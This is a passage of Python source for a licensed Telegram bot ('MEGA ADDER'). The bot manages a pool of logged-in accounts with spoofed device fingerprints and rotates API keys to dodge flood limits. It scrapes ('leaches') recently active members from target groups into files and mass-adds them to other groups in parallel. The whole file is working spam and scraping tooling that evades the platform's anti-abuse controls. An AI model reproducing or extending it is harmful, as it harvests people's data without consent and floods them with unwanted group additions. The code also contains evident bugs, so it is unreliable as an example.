                    new =  TelegramClient('Accounts/{0}'.format(key.split(':')[0]),w[0], w[1],
                      device_model=device,
                      system_version=version1,
                      app_version="7.84",
                      lang_code='en',
                      system_lang_code='en')

                    await new.connect()
                    if not await new.is_user_authorized():
                        try:
                            result = await new.send_code_request(key.split(':')[0])
                            data['code_mode'] = '{0}:{1}:{2}:{3}'.format(key.split(':')[0],result.phone_code_hash,api_info.split(':')[0],api_info.split(':')[1])
                            await new.disconnect()
                            await event.reply('**Done Code Sended Please Enter Code With This Format /code CODE **')
                        except Exception:
                            await event.reply('**Error In Send Code Please Try Again Later...**')
            except KeyError:
                await event.reply('** No Any Account In Queue**')



        elif event.raw_text.lower().startswith('/code'):
            
            


            try:

                #w = random.choice(apis)
               	device = random.choice(devices)
                version1 = random.choice(version)

                key = data['code_mode']
                await event.reply('**Please Wait ... **')
                print ( key.split(':')[2] ,key.split(':')[3])

                new =  TelegramClient('Accounts/{0}'.format(key.split(':')[0]), key.split(':')[2] ,key.split(':')[3], 
                                  device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

                await new.connect()


                await new(functions.auth.SignInRequest(phone_number=key.split(':')[0],phone_code_hash=key.split(':')[1],phone_code=event.raw_text.split('/code ')[1]))
                await event.reply('**Done Account Loginned Successfully!**')
                

                        
                data.clear()
            except errors.SessionPasswordNeededError:
                await event.reply('**Session Need Password Please Enter Password With This Format /step PASSWORD**')
                data.clear()
                data['step_mode'] = key
            except KeyError:
                await event.reply('** No Any Account In Queue**')
            await new.disconnect()



        elif event.raw_text.lower().startswith('/step'):
            try:
                

                device = random.choice(devices)
                version1 = random.choice(version)

                key = data['step_mode']
                m= await event.reply('**Please Wait ... **')
                k2 = get_api(key.split(':')[0])
                print (k2)
                #### -- anti flood
                #k2 = random.choice(apis)

                new =  TelegramClient('Accounts/{0}'.format(key.split(':')[0]),int(k2[0]),k2[1],       
                 device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

                await new.connect()

                await new.sign_in(password=event.raw_text.split('/step ')[1])
                data.clear()
                info = await new.get_me()

                result = None



                


                await new.disconnect()
                await event.reply('** \n ▬▭▬▭▬▭▬ \n 🔆 Done Api [{0}] Successfully Added To Database !\n \n ▬▭▬▭▬▭▬ \n Account Info\n 🔆 Account Username : {1}\n \n ▬▭▬▭▬▭▬ \n 🔆 Account Phone : +{2}\n  \n ▬▭▬▭▬▭▬ \n 🔆 Account FirstName : {3}\n \n ▬▭▬▭▬▭▬ \n 🔆 Account LastName : {4}** \n ▬▭▬▭▬▭▬ \n'.format(key.split(':')[2]+':'+key.split(':')[3],str(info.username),str(info.phone),info.first_name,info.last_name))
            except KeyError:
                await event.reply('** No Any Account In Queue**')
            except errors.PasswordHashInvalidError:
                await event.reply('**❌ Password Is Invalid Please Enter True Password With This Format /step PASSWORD**')
            await new.disconnect()




        elif event.raw_text.lower().startswith('leach'):
            
            link = event.raw_text.split('leach ')[1]



            await event.reply('''👽 Please Select Mode ❕
➖➖➖➖➖➖
🤖 Add with ChatID
➖➖➖➖➖➖
☠️ Add With Username ''' , buttons = [
                    [Button.inline('👽 Username ','@add|addUsername|{}'.format(link)),Button.inline('🤖 ChatID','@add|addChatid|{}'.format(link))],
                ])


    
        elif event.raw_text.lower() == 'accounts':
            ev = []
            tl = 0 
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name,'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl +=1
            if tl >= 1:
                try:
                    await event.reply('You have **{}** Accounts '.format(tl),buttons=ev)
            
                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev , 50):
                        await event.reply('You have **{}** Accounts '.format(tl),buttons=ev)

            else:
                await event.reply('Database Is Empty!')



        elif event.raw_text.lower().startswith('load'):
            l=[]
            my = event.raw_text.split('load ')[1]
            if my == 'all':
                ev = []
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name,'load|{}'.format(item.name))]]
                    ev.extend(l)

                if len(l) >= 1 :
                    await event.reply('🔆 You Can See All lists you can load list by click ',buttons=ev)
                else:
                    await event.reply('❌ List Is Empty!')
            else:
                w = get_file(my)
                if w != 0:
                    for item in w:
                        usernames.append((item.split('\n')[0]))
                        
                    await event.reply('🔆 Done Total {} Loaded Successfully!'.format(len(list(set(usernames)))))
                else:
                    await event.reply(' ❌ Wrong File name use load all to see files')



        elif event.raw_text.lower() == 'clear':
            if len(usernames) != 0:
                await event.reply('Are You Sure You Want To Delete {} ?'.format(len(usernames)) , buttons = [
                    [Button.inline('Yes','clean'),Button.inline('No','no')],
                ])
            else:
                await event.reply('Usernames Is Empty!')





        elif event.raw_text.lower() == 'info':
            await event.reply('🔆 Total Usernames : {}'.format(len(usernames)))


        elif event.raw_text.lower() == 'ping':
            await event.reply('Im Online !')





        elif event.raw_text.lower() == "spambot":


            await SendToSpamBot(event)



        elif event.raw_text.lower().startswith("add"):


            x = event.raw_text

            datas = (x.split(' ',1)[1]).split(' ')

            
            
            link = datas[0]
            num = datas[1]
            total = datas[2]

            await event.reply("👽 select " , buttons= [[Button.inline('👽 add with ID','addID|{}|{}|{}'.format(link, num, total))],[Button.inline('🤖 add with username','addUSERNAME|{}|{}|{}'.format(link, num, total))]] )



        #### ---- help :)

        elif event.raw_text.lower() == 'help':
            await event.reply('▬▭▬▭▬▭▬▭▬▭▬▭\n ●** help** \n\nFor Show Help Message \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/login** `Phone Number`\n\n For Login New Account \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/auth** `CODE`\n\nFor Verify Web Login\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/code** `CODE`\n\nFor Login With Code\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/step** `PASSWORD`\n\nFor Login With 2FA Password\n' , buttons = [
                [Button.inline('Close Panel','close'),Button.inline('▶️','nexthelp') ]
            ]) 

    else :
        await event.reply("⚠️ License Error \n ▬▭▬▭▬▭▬▭▬▭▬▭  please Contact @Add_GptoGp ! \n  ▬▭▬▭▬▭▬▭▬▭▬▭  ❌ You must Active your License !")




async def join2(clt,ls , log_msg): 
    print (" i am in join ")
    try:
        if '@' in ls:
                print ("join func")
                await clt(functions.channels.JoinChannelRequest(channel=ls))
                print ("xxxx")
        else:
                print ("join func")
                await clt(functions.messages.ImportChatInviteRequest(hash=ls.split('/')[-1]))
                print ("yyyyy")
        return True

    except errors.rpcerrorlist.FloodWaitError as e :

        wait = [int(s) for s in str(e).split() if s.isdigit()][0]

        wait += random.randint(100 , 200)


        await log_msg.edit("⚠️ [**join**] Wait for   ** {} ** secounds".format(wait))
        
        await asyncio.sleep(wait)

        return None


    except errors.rpcerrorlist.UserAlreadyParticipantError:
        return True

    except errors.UserDeactivatedBanError:
        print ("[!] UserDeactivatedBanError")
        
        await log_msg.edit("UserDeactivatedBanError")
        return -1
        
    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1
        
    except errors.SessionExpiredError:
        print ("[!] SessionExpiredError")
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1
        
    except errors.SessionRevokedError:
        print ("[1] SessionRevokedError")
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1                    


    except errors.rpcerrorlist.AuthKeyUnregisteredError:
        print ("AuthKeyUnregisteredError")
        await log_msg.edit("AuthKeyUnregisteredError")
        
        
        return -1                    

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print ("AuthKeyDuplicatedError")
        await log_msg.edit("UserDeactivatedBanError")
        
        
        return -1

        

    except errors.rpcerrorlist.UserDeactivatedError:
        print ("[!] UserDeactivatedError")
        
        await log_msg.edit("UserDeactivatedBanError")
        return -1
        

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print ("[!] UserDeactivatedBanError")
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1
        


    except errors.rpcerrorlist.SessionExpiredError:
        print ("[!] SessionExpiredError")
        
        await log_msg.edit("UserDeactivatedBanError")
        return -1
        


    except Exception as e :
        print ("FOO : " , e.__class__ , str(e))
        return -1

async def join(client,link , phone):
    print ("--------------> " , link)
    try:
        print (client)
        if '@' in link:
            print ("@ dar")
            await client(JoinChannelRequest(channel=link))
        else:
            print ("adiiii")
            await client(ImportChatInviteRequest(hash=link))
        return True
    except errors.UserAlreadyParticipantError:
        return True 
    except errors.UserDeactivatedBanError:
        return -1
    except errors.UserDeactivatedError:
        return -1
    except errors.SessionExpiredError:
        return -2
    except errors.SessionRevokedError:
        return -2

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        return -3


    except errors.UserDeactivatedBanError:
        print ("[!] UserDeactivatedBanError")
        
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4 ## Delete


    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4 ## Delete


    except errors.SessionExpiredError:
        print ("[!] SessionExpiredError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -4 ## Delete

    except errors.SessionRevokedError:
        print ("[1] SessionRevokedError")
        await client.disconnect()

        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -4 ## Delete


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print ("AuthKeyDuplicatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4 ## Delete

    except errors.rpcerrorlist.UserDeactivatedError:
        print ("[!] UserDeactivatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                

        return -4 ## Delete

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print ("[!] UserDeactivatedBanError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                

        return -4## Delete


    except errors.rpcerrorlist.SessionExpiredError:
        print ("[!] SessionExpiredError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               

        return -4 ## Delete


    except errors.rpcerrorlist.SessionPasswordNeededError:

        print ("[!] SessionPasswordNeededError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               

        return -4 ## Delete


    except Exception as e:
        print ("[!] UnExpected Error : {}".format(str(e)))
        await client.disconnect()


        return -4 ## Delete  



@bot.on(events.CallbackQuery)
async def evt(events):
    callback = events.data.decode()
    global addflag
    global noadd 
    global join

    if (int(events.original_update.user_id) in NStEVJzsyY):

        if (callback.startswith("admin")):

            _ , data = callback.split("|")

            NStEVJzsyY.remove(int(data))

            await events.answer("user {} removed from sudolist".format(data))

            try:
                await bot.send_message(int(data) , '''❌ Your Application Blocked by Owner ! 
➖➖➖➖➖➖ 
For Contact pm to @Ped007ram''')

            except Exception as e:

                await events.answer(str(e.__class__) + ":" + str(e))



        if callback.startswith("?"):
            
            #2|40|3|https://t.me/joinchat/UlqJhddT1kJjYTEx|addUSERNAME

            ev = []
            global addflag
            accs = []
            tl = 1
            
            
            ww = None
            text = ''

            print (callback.split("?")[1])
            num = int((callback.split("?")[1]).split("|")[0])
            delay = int((callback.split("?")[1]).split("|")[1])
            numacc = int((callback.split("?")[1]).split("|")[2])
            link = (callback.split("?")[1]).split("|")[3]
            mode = (callback.split("?")[1]).split("|")[4]

            print ("num" , num)
            print ("numACC" , numacc)
            
            delay = int(delay)
            
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline('{} - {}'.format(tl, item.name)),Button.inline('♻️')]]
                    accs.append(item.name)
                    ev.extend(l)
                    tl+=1
                    ev.extend([[Button.inline('Last Work '),Button.inline(time.ctime(time.time()))]])
            
            
            if len(ev) > 1 :

                try:
                    worker_msg = await events.reply('🏆 Target : {} 😉 \n 🎗 Add per account: {}'.format(link, delay),buttons = ev)
                
                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev , 50):
                        worker_msg = await events.reply('🏆 Target : {} 😉 \n 🎗 Add per account: {}'.format(link, delay),buttons = i)

            taskCount = 0
            tasklist=[]

            res1 = 0
            res2 = 0

            success = 0 
            faild   = 0
            duplicate =0

            start = time.time()

            accountL = []

            for item in accs:
                taskCount +=1
                tasklist.append(item)
                if (taskCount % numacc ==0):

                    
                    if (taskCount > int(numacc)):
                        break


                    if  numacc== 1:
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num))
                                
                        tasklist = []

                        res1 = await t1

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                    #---------------------------
                    elif numacc == 2:
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num))
                        t2 = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            

                    #-----------------------------
                    elif numacc == 3:
                        print ("ppppppppppppppppppppppppp")
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num))
                        t2 = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num))
                        t3 = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])  
                    #-----------------------------


                    #-----------------------------
                    elif numacc == 4:
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num))
                        t2 = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num))
                        t3 = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num))
                        t4 = bot.loop.create_task(foo(tasklist[4] , events , link , numacc , delay , worker_msg , mode , num))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success   += int(res4[0])
                            faild     += int(res4[1])
                            duplicate += int(res4[2])  
                    #-----------------------------



            remainAcc = len(tasklist)
            #print (remainAcc)
            for item in tasklist:
                
                if (taskCount > int(numacc)):
                    break
                
                taskCount +=1
                
                t1 = bot.loop.create_task(foo(item , events , link , numacc , delay , worker_msg , mode , num))

                res = await t1

                if res != None:

                    success   += int(res[0])
                    faild     += int(res[1])
                    duplicate += int(res[2])



            end = time.time()

            text = '''●╔══**Adding to `{}` with `{}` accounts **  **Add per :** `{}`\n\n 🏆 Jobs Completed {}

        ●╚══[⚡️ MEGA ADDER ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end-start)))[0:7])
            
            try:
                await events.reply(text , buttons=[[Button.inline("✅Success", "None") , Button.inline(str(success) , "None")]  , [Button.inline("❌Failed" ,"None") , Button.inline(str(faild) , "None")] , [Button.inline("⚠️Duplicate" ,"None") , Button.inline(str(duplicate) , "None")]])
            
            except Exception as e:
                print ("---------> " , e   , e.__class__)
                pass



        if callback.startswith("@"):

            [_ , mode , link]  = callback.split("|")

            print (link)

            cont=0


            if '@' in link or 'joinchat' in link:
                ev = []

                if 'joinchat' in link:
                    link = link.split('/')[-1]

                
                if mode == "addUsername":

                    for item in os.scandir('Accounts'):
                        if 'journal' not in item.name and '.session' in item.name:
                            l = [[Button.inline(item.name,'*l|{}|{}'.format(item.name, link))]]
                            ev.extend(l)
                            cont+=1
                    
                    try:        
                        await events.reply('🔆 OK Please select one account for leach from\nhttps://t.me/joinchat/{}'.format(link),buttons=ev)
            

                    except errors.rpcerrorlist.ReplyMarkupTooLongError:
                        for i in await list_splitter(ev , 20):
                            #print (i)

                            await events.reply('🔆 OK Please select one account for leach from\nhttps://t.me/joinchat/{}'.format(link),buttons=i)

                if mode == "addChatid":


                    ev = [Button.inline('Close Panel','close'),Button.inline('✅ Start','#l|{}'.format(link)) ]
                    
      
                    await events.reply('🔆 All Accounts Started for leach from\nhttps://t.me/joinchat/{}'.format(link),buttons=ev)






            else:
                await events.reply('🔆 Please Enter Link With True Format!\n🆘https://t.me/joinchat/example\n🆘@group')



        if callback.startswith("acccancell"):
            print (callback.split("|"))
            x = callback.split("|")[1]
            addflag[x] = "0"
            await events.answer("Add with this acc cancelled !")


        if callback.startswith(".addcencell"): 
            
            x = callback.split("|")[1]
            
            noadd = "0"
            await events.answer("All add cancelled !")

        if callback == "nexthelp":
            await events.edit(''' `leach` @group t.me/joinchat/t…

 For leach Users From Target Group
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `accounts`

For Show Delete or sort accounts
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `load` File Name all

Load File name load your target file
Load all load all lists and show you
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `info`

For See How Much usernames Loaded
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `ping`

For Check bot status
▬▭▬▭▬▭▬▭▬▭▬▭\n 

● `add` link numberOFAcc NumberOffAdd
\n

• numberOFAcc  : `How many acc work?` [num] 
• NumberOffAdd : `How many add Per acc` 

▬▭▬▭▬▭▬▭▬▭▬▭\n 
• /admin ID 

For admin a user with it's ID

▬▭▬▭▬▭▬▭▬▭▬▭\n 
• /sudolist  

For Show Sudo List

▬▭▬▭▬▭▬▭▬▭▬▭\n 
• /remadmin ID

Remove a User from Admin List

▬▭▬▭▬▭▬▭▬▭▬▭\n 


Add users to group link starts with @ or t.me/joinchat/ 
Pay Attention Max Number is **50**
▬▭▬▭▬▭▬▭▬▭▬▭\n ''' , buttons=[[Button.inline('◀️' ,'backhelp' ) , Button.inline('Close Panel','close')] ]
            ) 





        if callback =="backhelp":
            await events.edit('▬▭▬▭▬▭▬▭▬▭▬▭\n ●** help** \n\nFor Show Help Message \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/login** `Phone Number`\n\n For Login New Account \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/auth** `CODE`\n\nFor Verify Web Login\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/code** `CODE`\n\nFor Login With Code\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/step** `PASSWORD`\n\nFor Login With 2FA Password\n' , buttons = [
                [Button.inline('Close Panel','close'),Button.inline('▶️','nexthelp') ]
            ]) 



        if callback.startswith("#l"):
            
            device = random.choice(devices)
            version1 = random.choice(version)

            [_,link] = callback.split('|')

            flag = 0

            count =0

            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    
                    phone = item.name

                    count +=1
                    sleep(0.5)
                    
                    

                    await events.edit('| Please wait ... \n👽 Bot : {} '.format(count), buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leached .. ", "❌"), Button.inline( "❌", "✅")] ])
                    
                    #### --- anti flood
                    apis2 = random.choice(apis)

                    sleep(0.5)


                    if apis2 != 0:

                        try:
                        
                            ww = False

                            await events.edit("/ Please wait \n 👽 Bot : {}".format(count) ,  buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leached .. ", "❌"), Button.inline( "❌", "✅")] ])

                            client = TelegramClient('Accounts/{}'.format(phone),int(apis2[0]),apis2[1],

                                          device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')
                            
                            await client.connect()
                            
                            ww = await join(client,link ,phone)
                            
                            if ww == True:
                            
                                keu = link

                                

                                await events.edit('| Please wait 👽 Bot : {} '.format(count), buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Leached .. ", "❌"), Button.inline( "❌", "✅")] ])

                            
                                if '@' in link:
                            
                                    keu = link.split('@')[1]
                            

                                if (flag):

                                    links = link 

                                    if not '@' in link:
                                
                                        links = 'https://t.me/joinchat/{}'.format(link)                                   
                                    
                                
                                    for item in await  client.get_participants(links, aggressive=True):
                                        counter+=1

                                
                                

                                elif (flag == 0):

                                    

                                    f1 = open('Database/{}id.txt'.format(keu),'w')
                                 
                                    counter = 0

                                    links = link
                                    
                                    if not '@' in link:
                                
                                        links = 'https://t.me/joinchat/{}'.format(link)
                                
                                    for item in await client.get_participants(links, aggressive=True):
                                        if online_within(item , 6):
                                            f1.write(str(item.id) + "\n")

                                            counter +=1




                                    f1.close()
                                    await bot.send_file(events.chat_id, 'Database/{}id.txt'.format(keu), caption="🎗 Total `{}` Leached Users.\n\n  **You Can Load This Users with command load {}\nYou can see all lists with `load all`** ".format(counter, keu))    
                                    flag = 1

                                await events.edit('/ Please wait \n 👽 Bot : {}'.format(count),  buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Leached {}.. ".format(counter), "❌"), Button.inline( "✅", "✅")] ])

                                
                                await client.disconnect()            
                            elif ww == -1:
                                await events.edit('Your account has been deleted ! ...')
                                await client.disconnect()
                            elif ww == -2:
                                await events.edit('Sorry Bot kicked out from sessions ...')
                                await client.disconnect()

                            elif ww == -3:
                                await events.edit("Session Runed in Two different IP address plz choose another acc")
                                await client.disconnect()


                            elif ww == -4 :
                                await events.edit("sessions Error")
                                

                        except ValueError:
                            await events.respond("this link is invalid tray again ")
                            await client.disconnect()

                        except errors.rpcerrorlist.FloodWaitError as e:
                            wait = [int(s) for s in str(e).split() if s.isdigit()][0]
                            await events.respond(" `FloodWait ` : {} \n Try another Account".format(wait))
                            await client.disconnect()

                        except Exception as e:
                            await events.respond(" `Error ID PART ` : {} \n Tring  another Account".format(e.__class__))
                            await client.disconnect()                    

                    else:
                        await events.edit('Error In find api data for account {}! Please Re Login this account!'.format(phone))

            await events.reply("✅ Job Finished \n Use load all ")



        if callback.startswith('*l'):
            
            device = random.choice(devices)
            version1 = random.choice(version)

            
            [_, phone , link ] = callback.split('|')

            await events.answer('Please wait ...')
            sleep(0.5)

            await events.edit('| Please wait ... ', buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leached .. ", "❌"), Button.inline( "❌", "✅")] ])
            

            #### --- anti flood
            apis2 = random.choice(apis)

            sleep(0.5)



            if apis2 != 0:

                # try:

                    ww = False

                    await events.edit("/ Please wait" ,  buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leached .. ", "❌"), Button.inline( "❌", "✅")] ])
                    print ("before client")
                    client = TelegramClient('Accounts/{}'.format(phone),int(apis2[0]),apis2[1] ,              device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

                    print ("after client")
                    await client.connect()
                    print ("afler connect")


                    ww = await join(client,link , phone) ### if user Already in group & joint in it -> ww = 1
                    print ("after join")

                    

                    if ww == True:
                    
                        keu = link
                        await events.edit('| Please wait', buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Leached .. ", "❌"), Button.inline( "❌", "✅")] ])

                    
                        if '@' in link:
                    
                            keu = link.split('@')[1]
                    


                    
                        f1 = open('Database/{}.txt'.format(keu),'w')
                    

                        counter = 0

                        links = link
                    
                        if not '@' in link:
                    
                            links = 'https://t.me/joinchat/{}'.format(link)
                    
                        async for item in client.iter_participants(links, aggressive=True ):
                            if item.username != None:
                                    

                                if  online_within(item , 6): 
                                    f1.write(str(item.username) + '\n')

                                
                                    counter+=1

                        f1.close()

                        await events.edit('/ Please wait',  buttons=[[Button.inline( "Connection .. ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Loading Info.. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "joined .. ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Leached {}.. ".format(counter), "❌"), Button.inline( "✅", "✅")] ])

                        await bot.send_file(events.chat_id, 'Database/{}.txt'.format(keu), caption="🎗 Total `{}` Leached Users.\n\n  **You Can Load This Users with command load {}\nYou can see all lists with `load all`** ".format(counter, keu))    
                        await client.disconnect()            
                    elif ww == -1:
                        await events.edit('Your account has been deleted ! ...')
                        await client.disconnect()
                    elif ww == -2:
                        await events.edit('Sorry Bot kicked out from sessions ...')
                        await client.disconnect()

                    elif ww == -3:
                        await events.edit("Session Runed in Two different IP address plz choose another acc")
                        await client.disconnect()



                # except ValueError:
                #     await events.respond("this link is invalid tray again ")
                #     await client.disconnect()

                # except errors.rpcerrorlist.FloodWaitError as e:
                #     wait = [int(s) for s in str(e).split() if s.isdigit()][0]
                #     await events.respond(f" `FloodWait ` : {wait} \n Try another Account")
                #     await client.disconnect()

                # except Exception as e:
                #     await events.respond(f" `Error ` : {e.__class__} \n Try another Account")
                #     await client.disconnect()                    

            else:
                await events.edit('Error In find api data for account {}! Please Re Login this account!'.format(phone))


        elif callback == 'clean':
            usernames.clear()
            await events.edit('Done Usernames List is empty now!')
        

        elif callback == 'no':
            await events.edit('Ok i cancel this process')
        


        elif callback.startswith('load'):
            kuy = callback.split('|')[1]
            mfile = get_file(kuy.split('.txt')[0])

            print (kuy) ### -- debug 


            if mfile != 0 :
                for item in mfile:

                    if ("id" in kuy):
                        userid.append(int(item.split('\n')[0]))
                    else :
                        usernames.append((item.split('\n')[0]))

                ev = []
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name,'load|{}'.format(item.name))]]
                    ev.extend(l)
                if len(l) >= 1 :
                    ev.extend([[Button.inline("cancel" , "close")]])
                    
                    if ("id" in kuy):

                        await events.edit('✅ we have `{}` userid now!  \n\n  Add more ? '.format(len(list(set(userid)))) , buttons=ev)

                    else :
                        await events.edit('✅ we have `{}` usernames now!  \n\n  Add more ? '.format(len(list(set(usernames)))) , buttons=ev)


                else:
                    await events.reply('List Is Empty!')


                
            else:
                await events.edit('Sorry i cant load file ...')


        elif callback.startswith('settings'):
            phn = callback.split('|')[1]
            await events.reply('What you want with {} ?'.format(phn),buttons = [
                [Button.inline('🗑 Delete','delete|{}'.format(phn)),Button.inline('Close Panel','close')]
            ])

        elif callback == 'close':
            await events.edit('Panel Closed Successfully!')
        
        elif callback.startswith('delete'):
            pehen = callback.split('|')[1]
            try:
                os.remove('Accounts/{}'.format(pehen))
                await events.edit('Done Account {} Successfully Removed From Database!'.format(pehen))
            except :
                await events.edit('I cant delete {} From database ! Try Again later...'.format(pehen))




        elif (callback.startswith("add")):
            ev = []

            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:                   
                    ev.append(item.name)


            datas = callback.split("|")
            
            mode = datas[0]

            datas[1] = datas[1].strip()
            
            if 'joinchat' in datas[1] :
                link = datas[1]
            elif '@' in datas[1]:
                link = datas[1]
            else:
                link = None
            if link != None:
                if (len(ev) < int(datas[2])):
                    await events.reply("**⚠️ Number of Accounts is smaller than your Order ! **")
                else :    
                    msg = await events.reply('Please wait ...')
                    await worker(msg,datas[1],datas[2], datas[3] ,mode , usernames)
            else:
                await events.reply('🔆 Target group information is incorrect!')




if __name__ == '__main__':

    go()
    bot.run_until_disconnected()
